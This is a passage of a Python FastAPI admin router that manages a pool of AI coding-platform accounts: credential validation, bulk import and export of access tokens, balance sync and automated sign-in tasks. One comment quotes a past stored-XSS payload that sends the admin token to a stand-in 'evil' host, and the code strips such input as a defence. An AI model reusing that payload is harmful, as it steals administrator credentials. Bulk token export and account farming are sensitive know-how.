"""账号管理：列表 / 新增 / 批量上传 / 扫描本机 / 导入本机 / 刷新余额 / 启用禁用 / 删除 / 注入本机客户端。"""
import glob
import json
import logging
import os
import shutil
import tempfile
import threading
import time
import uuid
from datetime import datetime, timezone, timedelta
from typing import Callable, Literal, Optional

from fastapi import APIRouter, Depends, HTTPException, Request, Response
from fastapi.responses import FileResponse
from pydantic import BaseModel, validator
from sqlalchemy.orm import Session
from sqlalchemy import func, case

from admin import backend, jobrunner, wb_login, upstream_errors
from admin.account_binding import binding_owners, scope_accounts
from admin.credential_codec import CredentialDecodeError, encrypt_credential, normalize_credential
from admin.config import settings
from admin.db import SessionLocal, get_db
from admin.models import Account, AccountModelCooldown, ApiKey, ModelConfig, UsageLog
from admin.security import require_admin, clean_display_name

router = APIRouter(prefix="/api/accounts", tags=["accounts"])

#: 导入任务多久算僵死（秒）。超过这个时长 + 进度长时间不动 → 接管重跑。
#: 取 20 分钟：正常几百个号带验证也就几分钟，20 分钟还不推进基本是卡死了。
_STALE_JOB_SECONDS = 20 * 60
#: 进度空闲多久算卡住（秒）。
_STALE_JOB_IDLE_SECONDS = 5 * 60

# 模块内多处（含 _post_login_automation 的兜底日志）用 _logger；不定义的话
# 那些 except 分支会再抛一个 NameError，把原始异常盖掉。
_logger = logging.getLogger("admin.accounts")


# ---------------------------------------------------------------------------
# 导出文件暂存：异步导出在后台线程把 JSONL 写进临时文件，前端凭 token 下载一次
# 后删除。注册表常驻内存，配合 TTL 兜底清理，避免临时文件越积越多。
# ---------------------------------------------------------------------------
_export_registry: dict[str, dict] = {}
_export_registry_lock = threading.Lock()
_EXPORT_TTL_S = 1800


def _export_register(path: str, filename: str) -> str:
    token = uuid.uuid4().hex
    with _export_registry_lock:
        _purge_exports_locked()
        _export_registry[token] = {
            "path": path, "filename": filename,
            "exp": time.time() + _EXPORT_TTL_S,
        }
    return token


def _purge_exports_locked() -> None:
    """清掉 TTL 过期的导出文件（调用方需持有锁）。"""
    now = time.time()
    for tok in [t for t, e in _export_registry.items() if now > e["exp"]]:
        entry = _export_registry.pop(tok, None)
        if not entry:
            continue
        try:
            os.remove(entry["path"])
        except OSError:
            pass


def _export_lookup(token: str) -> dict | None:
    """按 token 取导出条目（**不删除**，TTL 内可重复下载）。"""
    with _export_registry_lock:
        _purge_exports_locked()
        entry = _export_registry.get(token)
    if not entry:
        return None
    if time.time() > entry["exp"]:
        return None
    return entry


def _parse_backup_records(text: str) -> list[dict]:
    """把手机版备份原文解析成记录列表（JSON 数组 或 JSONL）。

    导出/导入都要用：导出按记录分块写文件，导入按记录分块喂平台网关。
    整体是 JSON 数组时优先整体解析（单行几十 MB 的数组也能正确切开）。
    """
    text = (text or "").strip()
    if not text:
        return []
    try:
        parsed = json.loads(text)
    except Exception:
        parsed = None
    if isinstance(parsed, list):
        return [r for r in parsed if isinstance(r, dict)]
    if isinstance(parsed, dict):
        return [parsed]
    out: list[dict] = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        if isinstance(obj, dict):
            out.append(obj)
    return out


def _platform_import_module(storage: str):
    """懒加载非 WorkBuddy 平台的 import_batch 函数（避免顶层循环依赖）。"""
    mapping = {
        "trae": "admin.platform.trae.services.accounts",
        "qoder": "admin.platform.qoder.services.accounts",
        "loomy": "admin.platform.loomy.services.accounts",
        "raccoon": "admin.platform.raccoon.services.accounts",
        "minimax": "admin.platform.minimax.services.accounts",
        "wps-lingxi": "admin.platform.wps_lingxi.services.accounts",
        "wps_lingxi": "admin.platform.wps_lingxi.services.accounts",
    }
    modname = mapping.get((storage or "").lower())
    if not modname:
        raise HTTPException(status_code=400, detail=f"不支持的导入平台：{storage}")
    import importlib
    return importlib.import_module(modname)


class AccountIn(BaseModel):
    name: Optional[str] = None  # 留空则自动取真实昵称 / uid
    auth_json: str

    @validator('name', pre=True)
    def encrypted_name_is_not_a_label(cls, value):
        # Older browser pages submit account.nickname directly. The decrypted
        # credential/upstream profile supplies the real name after decoding.
        if isinstance(value, dict) and value.get('$wbEncrypted') == 1 and isinstance(value.get('envelope'), str):
            return None
        return value


class AccountBatchIn(BaseModel):
    items: list[AccountIn]
    #: 是否对每条做**真实上游验证**（默认开）。关掉只做结构校验，
    #: 速度快但无法识别伪造签名的凭证 —— 只建议在导入自己刚导出的数据时用。
    verify: bool = True


class InjectIn(BaseModel):
    confirm: bool = False
    #: 注入前是否重启本机客户端。
    #:
    #: 客户端把登录态放在内存里，只改磁盘文件撑不过一次令牌刷新（实测
    #: 2 分钟就被覆盖）。所以「注入并生效」= 关掉客户端 → 写文件 → 再拉起。
    #: 默认 **False**：重启会打断用户当前正在做的事，必须由他明确选择。
    restart_client: bool = False


class ImportLocalIn(BaseModel):
    files: list[str] = []  # 指定文件名；含 "all" 或 all=true 表示全部
    all: bool = False


class ExportIn(BaseModel):
    ids: list[int] = []      # 空 = 当前平台的全部
    include_disabled: bool = False
    format: Literal['backup', 'client'] = 'backup'
    #: 跨平台导出开关。默认 False = 只导当前平台（防止误把别的平台
    #: 凭证一起落盘）；显式 true 时导出**所有平台**的账号 ——
    #: 多平台部署下做整机迁移/全量备份时会用到。
    all_platforms: bool = False


class ExportAsyncIn(BaseModel):
    """异步导出请求（替代同步 /export，避免几万账号一次性卡死）。

    - ids 非空：只导出选中的账号（前端「导出选中」）
    - ids 为空 + status 指定：按状态导出（active / disabled）
    - ids 为空 + status 空：导出当前平台全部（include_disabled 控制是否含禁用）
    """
    ids: list[int] = []
    include_disabled: bool = False
    format: Literal['backup', 'client'] = 'backup'
    all_platforms: bool = False
    status: Optional[str] = None   # 'active' | 'disabled' | None=按 include_disabled
    #: 关键字筛选（名称 / uid 子串），用于「只导某一批号」。
    keyword: str = ""
    #: 条数上限（0 = 不限）。配合 keyword / status 做分批导出：
    #: 例如先导 500 个，处理完再导下一批。
    limit: int = 0
    #: 起始偏移。与 limit 组合 = **分片导出**（第 N 片 = offset=(N-1)*片大小,
    #: limit=片大小）—— 号池几十万条时一片一片导，不把导出队列堵死。
    offset: int = 0


class ImportAsyncIn(BaseModel):
    """异步导入请求（替代同步 /batch 与平台 import-batch，带进度条）。"""
    storage: str = "workbuddy"     # workbuddy / codebuddy / trae / qoder / loomy
    text: str = ""                 # 非 WB 平台：JSONL / JSON 数组原文
    items: list[dict] = []         # WB 平台：与 /batch 同结构的凭据列表
    verify: bool = True


class HealthCheckBatchIn(BaseModel):
    account_ids: Optional[list[int]] = None

    @validator('account_ids')
    def limit_health_check_ids(cls, value):
        if value is not None and len(value) > 5000:
            raise ValueError('一次最多检查 5000 个账号')
        return value


class RefreshBatchIn(BaseModel):
    """批量刷新的目标账号。

    **不传就按当前平台作用域取**（`X-Platform`），绝不退化成全库 ——
    拿默认平台的协议去刷其它平台的账号，每个号必然失败一次。
    """
    account_ids: Optional[list[int]] = None

    @validator('account_ids')
    def limit_refresh_ids(cls, value):
        if value is not None and len(value) > 5000:
            raise ValueError('一次最多刷新 5000 个账号')
        return value


def _uid_of(auth_json: str) -> str:
    """从 auth_json 里取 uid；取不到返回空串。"""
    try:
        return (backend.parse_auth_meta(auth_json) or {}).get("uid") or ""
    except Exception:
        return ""


def _reject_non_credential(auth_json: str) -> dict:
    """上传入口的**唯一**把关：不是客户端授权凭证就拒收。

    这里刻意复用 `wb_login.validate_credential` —— 与手机号登录入库那条路
    共用同一个校验器。两条路对「什么算合法凭证」必须完全一致，
    否则严格的那条就成了摆设（攻击者走宽松的那条即可）。

    为什么必须拦（而不是像原来那样只 `json.loads` 一下）：
    `json.loads` 只证明「是合法 JSON」，`{}`、`{"foo":1}`、
    `/v1/auth/accounts` 的账号列表、裸 accessToken 全都算「合法 JSON」，
    但它们都不是凭证 —— 收进来只会得到一条刷新余额必然失败的死记录，
    还会污染号池统计（看起来有 N 个号，实际可用的是少数）。

    抛 400 并把原因回给调用方，避免用户面对一句「格式错误」无从下手。
    返回校验得到的 meta（uid 等），供调用方复用。
    """
    check = wb_login.validate_credential(auth_json)
    if not check.ok:
        raise HTTPException(status_code=400, detail={
            "message": f"不是有效的客户端凭证：{check.reason}",
            "step": "validate",
        })
    return check.meta


def _decode_or_400(auth_json: str) -> str:
    try:
        return normalize_credential(auth_json)
    except CredentialDecodeError as exc:
        raise HTTPException(status_code=400, detail={
            'message': str(exc), 'step': 'decrypt',
        }) from None


def _verify_credential_live_or_400(auth_json: str):
    """**真实上游**验证：确认凭证可用、非伪造，并取回真实账号信息 + 余额。

    与 `_reject_non_credential`（纯结构）是两道独立关卡：
    结构校验挡不住「JWT 字段齐全但签名是编的」——那种凭证的
    accessToken/refreshToken/uid/expiresAt 全都能随手编。

    返回 `(profile, balance)`；`balance` 是验证阶段顺带拿到的真实余额，
    调用方可以直接写库，**不必再补一次完全一样的请求**。
    """
    probe = wb_login.probe_credential_live(auth_json)
    if not probe.ok:
        raise HTTPException(status_code=400, detail={
            "message": f"凭证未通过上游验证：{probe.message}",
            "step": "live_probe",
            "reason": probe.reason,
        })
    return (probe.profile or {}), (probe.balance or {})


def _post_login_automation(account_id: int, name: str) -> None:
    """登录/上传成功后，后台自动做成长任务 + 猫猫旅行 + 签到。

    直接复用登录路由里那套实现：**同一个行为不该有两份代码**，
    否则「手机号注册进来的号会自动做任务、上传进来的号不会」这种
    不一致会非常难发现。
    """
    try:
        from admin.routers.login import _schedule_post_login_automation
        _schedule_post_login_automation(account_id, name)
    except Exception:
        _logger.exception("提交登录后自动任务失败（不影响入库）")


def _existing_uid_index(db: Session) -> dict[str, Account]:
    """uid -> 已存在的账号记录（同 uid 有多条时保留 id 最小的那条）。

    历史遗留的重复记录不影响导入：无论哪条都会命中，从而跳过重复导入。
    """
    idx: dict[str, Account] = {}
    for a in db.query(Account).order_by(Account.id.asc()).all():
        if not a.uid:
            continue
        idx.setdefault(a.uid, a)   # 先到先得 = id 最小
    return idx


def _find_dup(db: Session, auth_json: str) -> Account | None:
    """按 uid 查这个凭据是否已在号池里。"""
    uid = _uid_of(auth_json)
    if not uid:
        return None
    return (db.query(Account)
            .filter(Account.uid == uid)
            .order_by(Account.id.asc())
            .first())


#: client（加密 .info）格式只对 WorkBuddy 系有意义：encrypt_credential 要求
#: auth_json 里有 `auth` 字典并加密其中的 accessToken/refreshToken —— 其它
#: 平台（qoder/loomy/codearts/…）的凭据结构完全不同，强行走这条路径只会
#: 409「凭证结构无效」（2026-11-07 修复：此前其它平台单号导出全部报错）。
_CLIENT_EXPORT_PLATFORMS = ("workbuddy", "codebuddy")


def _uses_client_format(platform: str | None) -> bool:
    return str(platform or "").strip().lower() in _CLIENT_EXPORT_PLATFORMS


def _export_items(rows: list[Account], format: str = 'backup') -> list[str]:
    """把账号记录还原成 .info 原文列表。

    导出的是 auth_json 原文（与上传接受的格式完全一致），
    因此导出文件可以直接再传回来，不需要额外转换。
    `format=client` 只对 WorkBuddy 系账号生效：其它平台自动落回
    backup 原文（逐行按账号自己的平台判断，批量跨平台导出也不报错）。
    """
    items: list[str] = []
    for a in rows:
        raw = (a.auth_json or "").strip()
        if not raw:
            continue
        try:
            json.loads(raw)
        except Exception:
            continue  # 跳过损坏记录，避免整个导出失败
        if format == 'client' and _uses_client_format(getattr(a, "platform", None)):
            items.append(_client_export(raw))
        else:
            items.append(raw)
    return items


def _client_export(raw: str) -> str:
    try:
        return encrypt_credential(raw)
    except CredentialDecodeError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from None


@router.post("/export")
def export_accounts(
    body: ExportIn,
    response: Response,
    request: Request = None,
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """Export portable backups or official encrypted client credentials.

    **按平台收窄**：导出是对外落盘的操作，串平台会把别的平台的凭证
    一起导出（严重信息事故）。未显式指定 ids 时用当前平台作用域。
    """
    response.headers['Cache-Control'] = 'no-store'
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    q = db.query(Account)
    # 先按平台收窄（含显式 ids 的情况：挡住「导出别的平台的号」）。
    # `all_platforms=True` 时跳过这一步 —— 全量备份本来就要跨平台。
    if not body.all_platforms:
        q = platform_scope.filter_accounts(q, db, platform, realm)
    if body.ids:
        q = q.filter(Account.id.in_(body.ids))
    elif not body.include_disabled:
        q = q.filter(Account.status == "active")
    rows = q.order_by(Account.id).all()

    items = _export_items(rows, body.format)
    # 2026-11-02 事故的直接出口（7 次全量导出、最大 112043 字节）。
    # 每次导出都留一条可追溯的审计记录，包含条数与来源；不记录任何凭据内容。
    import logging as _logging
    _ip = request.client.host if (request is not None and request.client) else "?"
    _logging.getLogger("admin.accounts.export").warning(
        "账号凭证导出 ip=%s ua=%s format=%s all_platforms=%s ids=%s count=%d",
        _ip,
        (request.headers.get("user-agent", "")[:160] if request is not None else ""),
        body.format, bool(getattr(body, "all_platforms", False)),
        len(getattr(body, "ids", None) or []), len(items))
    return {
        "format": body.format,
        "platform_scope": "all" if body.all_platforms else (platform or "all"),
        "total": len(rows),
        "count": len(items),
        "skipped": len(rows) - len(items),
        "items": items,
        # 附带摘要供前端展示（不含凭据）
        "summary": [
            {"id": a.id, "platform": a.platform or "", "name": a.name,
             "uid": a.uid, "status": a.status,
             "balance_total": a.balance_total, "balance_remain": a.balance_remain}
            for a in rows
        ],
    }


@router.post("/export-async")
def export_accounts_async(body: ExportAsyncIn, request: Request = None,
                          _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """异步导出：后台线程逐条写出 JSONL，前端轮询进度，完成后凭 token 下载。

    解决「导出几万账号直接卡死、没有进度条」：
      * 不再一次性 query.all() 全量 + 整包返回（原来响应能到几百 MB，浏览器直接卡死）；
      * 只先取 id 列表（轻量），再分窗口读行、逐条还原/加密、增量写文件；
      * 进度通过 jobrunner 上报，前端有进度条；
      * 支持导出范围：选中(ids) / 当前平台全部 / 仅可用 / 仅禁用。
    """
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    q = db.query(Account.id)
    if not body.all_platforms:
        q = platform_scope.filter_accounts(q, db, platform, realm)
    if body.ids:
        q = q.filter(Account.id.in_(body.ids))
    elif body.status:
        q = q.filter(Account.status == body.status)
    elif not body.include_disabled:
        q = q.filter(Account.status == "active")
    kw = (body.keyword or "").strip()
    if kw:
        like = f"%{kw}%"
        q = q.filter(func.coalesce(Account.name, "").like(like)
                     | func.coalesce(Account.uid, "").like(like))
    q = q.order_by(Account.id.asc())
    if body.offset and body.offset > 0:
        q = q.offset(int(body.offset))
    if body.limit and body.limit > 0:
        q = q.limit(int(body.limit))
    ids = [r[0] for r in q.all()]
    db.close()
    if not ids:
        raise HTTPException(status_code=400, detail="当前范围没有可导出的账号")

    key = "account-export:" + (platform or "all")
    running = jobrunner.RUNNER.get(key)
    if running and running.status == "running":
        return {"reused": True, **running.snapshot()}

    total = len(ids)
    fd, path = tempfile.mkstemp(prefix="miraihub-export-", suffix=".jsonl")
    os.close(fd)
    stamp = time.strftime("%Y%m%d-%H%M")
    filename = f"miraihub-accounts-{body.format}-{platform or 'all'}-{stamp}.jsonl"

    def worker(job: jobrunner.Job) -> dict:
        db2 = SessionLocal()
        written = 0
        skipped = 0
        try:
            job.set_phase("导出中")
            with open(path, "w", encoding="utf-8") as fh:
                # 分窗口读，避免一次把全量 Account 行（含 auth_json 大字段）加载进内存
                for start in range(0, total, 500):
                    chunk = ids[start:start + 500]
                    rows = db2.query(Account).filter(Account.id.in_(chunk)).all()
                    for a in rows:
                        raw = (a.auth_json or "").strip()
                        if not raw:
                            skipped += 1
                            continue
                        try:
                            json.loads(raw)
                        except Exception:
                            skipped += 1
                            continue
                        line = raw
                        if body.format == "client":
                            try:
                                line = encrypt_credential(raw)
                            except CredentialDecodeError:
                                skipped += 1
                                continue
                        fh.write(line + "\n")
                        written += 1
                    db2.commit()
                    job.set_done(min(start + 500, total),
                                 f"已导出 {written} 条（跳过 {skipped}）")
            token = _export_register(path, filename)
            return {"file_token": token, "count": written,
                    "skipped": skipped, "total": total, "format": body.format}
        except Exception:
            try:
                os.remove(path)
            except OSError:
                pass
            raise
        finally:
            db2.close()

    job = jobrunner.RUNNER.start(key, total, worker, title="批量导出账号")
    return job.snapshot()


@router.get("/export-download")
def export_download(token: str, _: bool = Depends(require_admin)):
    """凭导出任务返回的 token 下载 JSONL 文件。

    文件在 TTL（默认 30 分钟）内可**重复下载**，便于「自动下载被浏览器拦了
    再手动点一次」；过期后由注册表清理或下次注册时统一删除。
    """
    entry = _export_lookup(token)
    if not entry:
        raise HTTPException(status_code=404, detail="导出文件不存在或已过期")
    p = entry["path"]
    if not os.path.exists(p):
        raise HTTPException(status_code=404, detail="导出文件已不存在")
    return FileResponse(
        p, filename=entry["filename"], media_type="application/x-ndjson",
    )


@router.get("/job/{job_id}")
def account_job(job_id: str):
    """查询账号相关后台任务进度（导出 / 导入）。"""
    job = jobrunner.RUNNER.by_id(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="任务不存在或已过期")
    return job.snapshot()


@router.get("/probe")
def probe(_: bool = Depends(require_admin)):
    """启动探针：只验凭据，**不碰账号表**。

    控制台首屏原来用 `GET /api/accounts` 判断"是否已登录"，账号池上万条时
    这一步会把整张表拖下来，期间应用一直藏着不显示，用户看到的就是
    "页面出来了但按钮全都点不了"。这里换成一个 O(1) 的鉴权探针。
    """
    return {"ok": True}


@router.get("/badges")
def account_badges(request: Request = None, _: bool = Depends(require_admin),
                   db: Session = Depends(get_db)):
    """侧栏角标用的**极小**汇总（纯 SQL 聚合，不加载任何账号行）。

    为什么要单独一个接口：侧栏「积分到期」那个小圆点在控制台首屏就要亮，
    而以前它是 `GET /api/accounts` 的 `summary.expiring_accounts` 带出来的 ——
    那意味着**打开任何一个页面**都要先把全量账号（线上是本地测试数据的 n 倍）
    拉一遍、再在 Python 里逐行判一遍。这就是「我停在首页却把账号池也加载了」
    最贵的那一次请求。

    这里只查两个计数，全部走 `status` / `credits_expiring_soon` 两个列：
    返回体十几字节，代价与账号数线性但**不反序列化任何凭证字段**。
    真正需要明细的页面（账号池 / 积分到期）照旧走各自的接口。
    """
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    base = db.query(Account).filter(Account.status == "active")
    if platform:
        base = platform_scope.filter_accounts(base, db, platform, realm)
    expiring = base.filter(Account.credits_expiring_soon > 0).with_entities(
        func.count(Account.id)).scalar() or 0
    return {"expiring_accounts": int(expiring), "scope": platform or "all"}


@router.post("/count")
def count_accounts(request: Request = None, _: bool = Depends(require_admin),
                   db: Session = Depends(get_db)):
    """当前平台作用域内的账号计数（轻量，只聚合 id，不加载全量行）。

    供批量操作前的确认弹窗使用，避免前端为了拿个数量去 GET /api/accounts
    把几万条账号全拉下来（那是批量任务卡死的主因之一）。
    """
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    base = db.query(Account)
    if platform:
        base = platform_scope.filter_accounts(base, db, platform, realm)
    total = base.with_entities(func.count(Account.id)).scalar() or 0
    active = base.filter(Account.status == "active").with_entities(
        func.count(Account.id)).scalar() or 0
    return {"total": total, "active": active, "disabled": total - active,
            "scope": platform or "all"}


@router.post("/import-async")
def import_accounts_async(body: ImportAsyncIn, request: Request = None,
                          _: bool = Depends(require_admin)):
    """异步导入：后台线程跑导入逻辑，前端轮询进度，完成后返回汇总。

    解决「批量导入几万账号直接卡死、没有进度条」：
      * WorkBuddy 走 _batch_add_core（含结构校验 + 可选上游验证），逐条上报进度；
      * 非 WB 平台走各自 import_batch（认平台的备份形态），后台跑不阻塞 UI；
      * 与导出共用 jobrunner 与 /api/accounts/job/{id} 进度查询。
    """
    storage = (body.storage or "workbuddy").lower()
    if storage in ("workbuddy", "codebuddy"):
        if not body.items:
            raise HTTPException(status_code=400, detail="没有提供任何账号凭证")
        total = len(body.items)
        key = "account-import:workbuddy"
    else:
        if not body.text or not body.text.strip():
            raise HTTPException(status_code=400, detail="没有提供任何账号凭证")
        # 用记录数而不是行数：单行 JSON 数组如果按行计数会得到 1，
        # 进度条就会「1/1 秒完成」却还在跑。
        total = max(1, len(_parse_backup_records(body.text)))
        key = "account-import:" + storage

    running = jobrunner.RUNNER.get(key)
    if running and running.status == "running":
        # ## 卡死自愈（2026-11-10）
        #
        # 原来只要这个平台有一条 job 处于 running，新的导入请求就直接
        # `reused: True` 把旧 job 的快照返回 —— 用户看到的是「点了没反应」。
        # 一旦那条 job 因上游超时/网络卡住没退出，这个平台的导入就**永久
        # 被锁死**（实测：WorkBuddy 导十几个号卡一次之后，后面每次导入
        # 都立刻返回同一个旧进度）。
        #
        # 判定僵死：跑了超过 `_STALE_JOB_SECONDS` 且最近
        # `_STALE_JOB_IDLE_SECONDS` 内进度完全没推进。
        age = (datetime.utcnow()
               - (running.started_at or datetime.utcnow())).total_seconds()
        last = getattr(running, "updated_at", None) or running.started_at
        idle = (datetime.utcnow() - last).total_seconds() if last else age
        if age > _STALE_JOB_SECONDS and idle > _STALE_JOB_IDLE_SECONDS:
            _logger.warning("导入任务僵死，接管重跑 key=%s age=%.0fs idle=%.0fs",
                           key, age, idle)
            try:
                running.status = "failed"
                running.error = "stale_takeover"
            except Exception:  # noqa: BLE001
                pass
        else:
            return {"reused": True, **running.snapshot()}

    def worker(job: jobrunner.Job) -> dict:
        db = SessionLocal()
        try:
            job.set_phase("导入中")
            if storage in ("workbuddy", "codebuddy"):
                items = [AccountIn(name=it.get("name"), auth_json=it["auth_json"])
                         for it in body.items
                         if isinstance(it, dict) and it.get("auth_json")]
                b = AccountBatchIn(items=items, verify=body.verify)
                res = _batch_add_core(
                    b, db,
                    on_progress=lambda d, t: job.set_done(d, f"已导入 {d}/{t}"))
            else:
                mod = _platform_import_module(storage)
                # 按**记录**分块（不是按行）：备份可能是「单行 JSON 数组」，
                # 按行切会把 JSON 切碎导致解析失败。先解析成记录再序列化成
                # JSONL 分块喂给平台 import_batch —— 它本身按 (platform, uid)
                # 幂等，分块结果与整包等价，但能一边导一边报进度。
                records = _parse_backup_records(body.text)
                if not records:
                    # 有的平台凭证**不是 JSON**：灵犀的就是一行 `wps_sid=…`，
                    # 用户在控制台粘贴框里粘的也是这一段。解析不出记录时把原文
                    # 整段交给平台 import_batch，由平台自己决定认不认 ——
                    # 否则「粘贴 Cookie 导入」会 100% 报「没有解析出任何账号记录」。
                    raw_text = (body.text or "").strip()
                    if raw_text and hasattr(mod, "import_batch"):
                        try:
                            part = mod.import_batch(db, raw_text) or {}
                        except Exception as exc:  # noqa: BLE001 - 单批失败要如实回
                            return {"ok": False, "added": 0, "updated": 0,
                                    "failed": 0, "total": 0,
                                    "errors": [str(exc)[:160]]}
                        return {"ok": bool(part.get("ok", True)),
                                "added": int(part.get("added") or 0),
                                "updated": int(part.get("updated") or 0),
                                "failed": int(part.get("failed") or 0),
                                "total": int(part.get("total") or 0),
                                "errors": list(part.get("errors") or [])[:200]}
                    return {"ok": False, "added": 0, "updated": 0, "failed": 0,
                            "total": 0,
                            "errors": ["没有解析出任何账号记录（应为 JSONL 或 JSON 数组）"]}
                # 分块大小：小批次用小块，保证「导一个算一个」的语义。
                #
                # 固定 200 时，十几个号的备份等于**一整块**：平台 `import_batch`
                # 内部统一提交，中途一卡死整批丢失。≤50 条时降成 5 条一块，
                # 丢的窗口最多 5 个；大批次仍用 200（块太小会把逐块探活的开销
                # 放大成主要耗时）。
                chunk_size = 5 if len(records) <= 50 else 200
                agg = {"ok": True, "added": 0, "updated": 0, "failed": 0,
                       "total": 0, "errors": []}
                # 平台若支持细粒度进度（例如 Loomy 的并发探活），把 job 的
                # set_done 传进去 —— 否则 100 个号在探活阶段进度条是死的，
                # 用户以为卡住了（实测反馈）。用签名探测而不是写死平台名。
                try:
                    import inspect as _inspect

                    _supports_progress = "on_progress" in _inspect.signature(
                        mod.import_batch).parameters
                except (TypeError, ValueError):
                    _supports_progress = False
                for start in range(0, len(records), chunk_size):
                    chunk = "\n".join(
                        json.dumps(r, ensure_ascii=False)
                        for r in records[start:start + chunk_size])
                    kwargs = {}
                    if _supports_progress:
                        def _on_progress(done, total, note=""):
                            job.set_done(
                                min(start + int(done), len(records)),
                                note or "已导入 %d 条（更新 %d，失败 %d）"
                                % (agg["added"], agg["updated"], agg["failed"]))
                        kwargs["on_progress"] = _on_progress
                    part = mod.import_batch(db, chunk, **kwargs) or {}
                    for k in ("added", "updated", "failed", "total"):
                        agg[k] += int(part.get(k) or 0)
                    for e in (part.get("errors") or [])[:20]:
                        if len(agg["errors"]) < 200:
                            agg["errors"].append(e)
                    for k in ("probe_ok", "probe_failed", "elapsed_ms"):
                        if k in part:
                            agg[k] = int(agg.get(k) or 0) + int(part.get(k) or 0)
                    agg["ok"] = agg["ok"] and (part.get("ok", True) is not False)
                    job.set_done(min(start + chunk_size, len(records)),
                                 f"已导入 {agg['added']} 条（更新 {agg['updated']}，失败 {agg['failed']}）")
                res = agg
            # 导入成功后**立刻补种**该平台的定时任务（签到/保活/过期清理）：
            # `ensure_platform_schedules` 对「没有账号的平台」不建任务，
            # 而它此前只在启动时跑 —— 新导入的平台要重启一次才会有任务，
            # 表现就是用户反馈的「其它平台的任务没进定时任务」。
            try:
                if (res or {}).get("added") or (res or {}).get("updated"):
                    from admin.scheduler import ensure_platform_schedules
                    ensure_platform_schedules(db)
            except Exception:  # noqa: BLE001 - 补种失败不影响导入结果
                logging.exception("导入后补种平台定时任务失败 storage=%s", storage)
            return res
        finally:
            db.close()

    job = jobrunner.RUNNER.start(key, total, worker, title="批量导入账号")
    return job.snapshot()


def _client_auth_dir() -> str:
    d = settings.CLIENT_AUTH_DIR or os.path.expandvars(
        r"%LOCALAPPDATA%\CodeBuddyExtension\Data\Public\auth"
    )
    return os.path.expandvars(d)


def _apply_meta(acc: Account, auth_json: str, profile: dict | None = None,
                balance: dict | None = None):
    """把凭证里的元信息落到账号记录上。

    `profile` 是**上游验证时返回的真实账号信息**。它优先于凭证里声明的值：
    凭证的 `account.*` 是提交者自己写的（可以由着性子改），而上游返回的
    是腾讯侧的事实 —— 用事实覆盖声明，避免「真令牌 + 假昵称/假 uid」入库。

    `balance` 是验证阶段顺带拿到的真实余额，直接写库，
    不用再补一次 `fetch_balance()`（同一个请求打两遍纯属浪费）。
    """
    meta = backend.parse_auth_meta(auth_json)
    prof = profile or {}
    try:
        old_auth = json.loads(acc.auth_json or '{}').get('auth')
        new_auth = json.loads(auth_json or '{}').get('auth')
        changed = bool(new_auth) and new_auth != old_auth
    except (ValueError, TypeError, AttributeError):
        changed = bool(auth_json) and auth_json != acc.auth_json
    if changed:
        session_disabled = acc.cool_kind == 'session_dead' and acc.status == 'disabled'
        acc.last_err_msg = ''
        acc.last_err_at = None
        acc.last_upstream_error = ''
        acc.session_dead_fails = 0
        if acc.cool_kind == 'session_dead':
            acc.cool_kind = ''
            acc.cool_until = None
        # A manual disable must survive credential import. Only restore a
        # session-disabled account after live verification of the new credential.
        if session_disabled and (profile or balance):
            acc.status = 'active'
    acc.auth_json = auth_json
    uid = str(prof.get("uid") or meta.get("uid") or "")
    if uid:
        acc.uid = uid
    eid = str(prof.get("enterpriseId") or meta.get("enterprise_id") or "")
    if eid:
        acc.enterprise_id = eid
    if meta.get("domain"):
        acc.domain = meta["domain"]
    # 余额：拿不到就不动（绝不写 0 覆盖掉已知的真实值）
    if balance:
        acc.balance_total = int(balance.get("total") or 0)
        acc.balance_remain = int(balance.get("remain") or 0)
        acc.last_sync_at = datetime.utcnow()
    # 号池名称：上游真实昵称 → 上游手机号 → 凭证昵称 → uid
    # （昵称为 null/空串/"null" 一律视为缺失）
    #
    # ⚠️ 昵称是**提交者可控**的：他可以把自己的 WorkBuddy 昵称改成任意字符串，
    # 而它会被渲染进后台账号行。历史上这里是原样入库，导致 stored XSS
    # （`');fetch('//evil/…',localStorage.wb_admin_token)//` 偷后台令牌）。
    # 现在统一过 clean_display_name：只留纯文本，元字符全部剔除。
    if not acc.name:
        acc.name = (clean_display_name(prof.get("nickname"))
                    or clean_display_name(prof.get("phoneNumber"))
                    or clean_display_name(meta.get("nickname"))
                    or clean_display_name(uid)
                    or "未命名")


#: 「快过期积分」的判定窗口（天）。
#:
#: 官方套餐页与参考实现都以 **7 天** 为界（官方把 7 天内到期的额度标成橙色）。
#: 这里保留 30 天的 `EXPIRING_SOON_DAYS` 供**旧字段** `credits_expiring` 使用
#: （向后兼容，三因子加权的历史行为不变），而新的严格口径一律读
#: `admin.credits.EXPIRING_SOON_DAYS`（=7）。
EXPIRING_SOON_DAYS = 30


def _compute_expiring(normalized: list[dict]) -> int:
    """从**归一化**积分明细里算出「即将过期」的剩余额度合计（30 天旧口径）。

    .. deprecated:: 新代码请直接用 `credits.summarize_account` 的
       `expiring_soon_remaining`（7 天窗口）。本函数只用于维护历史字段
       `credits_expiring`，让三因子加权策略的行为与升级前保持一致。

    判定：有过期时间（`expire_at` 非空）且距今不超过 EXPIRING_SOON_DAYS 天，
    把这些包的剩余额度加起来。长期有效的包不计入。
    """
    now_ms = datetime.now(timezone.utc).timestamp() * 1000
    horizon_ms = EXPIRING_SOON_DAYS * 86400 * 1000
    total = 0
    for p in normalized or []:
        try:
            ts = int(p.get("expire_at") or 0)
        except Exception:
            continue
        if ts <= 0:
            continue
        left = ts - now_ms
        if 0 <= left <= horizon_ms:
            total += int(p.get("remaining") or 0)
    return total


def _sync_credit_snapshot(acc: Account, packages: list[dict]) -> dict:
    """把逐包积分明细归一化后写回账号记录，并返回账号级到期汇总。

    这是「快到期的先用完」这条调度的**唯一数据来源**：写回后，
    选号路径只需要读 `acc.credits_expiring_soon` / `acc.credits_soonest_expire_at`
    两个列，不必为每个候选账号发一次上游请求。

    为什么把明细也存下来（`credits_snapshot`）：参考实现能做出「最近快到期的
